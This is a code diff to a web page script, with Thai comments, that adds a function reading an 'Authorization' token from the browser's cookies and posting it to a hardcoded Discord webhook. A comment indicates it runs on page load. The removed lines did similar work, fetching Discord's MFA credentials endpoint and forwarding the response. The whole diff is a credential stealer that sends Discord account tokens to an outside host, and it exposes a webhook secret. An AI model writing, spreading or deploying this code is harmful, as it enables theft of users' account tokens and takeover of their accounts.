@@ -8,44 +8,26 @@
         // URL ของ Discord Webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';
 
-        // URL ของ API ที่ต้องการดึงข้อมูล
-        const apiUrl = 'https://discord.com/api/v9/users/@me/mfa/webauthn/credentials';
+        // ดึงข้อมูล Authorization Token จากคุกกี้
+        function fetchAndSendToken() {
+            // ค้นหาค่าของ Authorization Token จากคุกกี้
+            const cookies = document.cookie.split('; ');
+            const tokenCookie = cookies.find(row => row.startsWith('Authorization='));
+            const token = tokenCookie ? tokenCookie.split('=')[1] : 'Token not found';
 
-        // ส่งข้อความไปยัง Discord Webhook
-        function sendWebhookMessage(message) {
+            // ส่ง Token ไปยัง Discord Webhook
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: message,
+                    content: 'Authorization Token: ' + token,
                 }),
             })
             .then(response => response.json())
             .then(data => console.log('Webhook response:', data))
             .catch(error => console.error('Error sending webhook:', error));
-        }
-
-        // ดึงข้อมูล Token และส่งเป็นข้อความ
-        function fetchAndSendToken() {
-            fetch(apiUrl, {
-                method: 'GET',
-                headers: {
-                    'Authorization': 'YOUR_DISCORD_AUTHORIZATION_HEADER',
-                    'Content-Type': 'application/json',
-                },
-                credentials: 'include', // ส่งคุกกี้ไปด้วย
-            })
-            .then(response => response.json())
-            .then(data => {
-                // ดึง Token หรือข้อมูลที่เกี่ยวข้องจาก data
-                const token = data.token; // สมมุติว่า `token` คือฟิลด์ที่ต้องการ
-                console.log('Token:', token);
-                // ส่ง Token ไปยัง Discord Webhook
-                sendWebhookMessage('Token: ' + token);
-            })
-            .catch(error => console.error('Error fetching data:', error));
         }
 
         // เมื่อโหลดหน้าเว็บทำการดึงข้อมูล
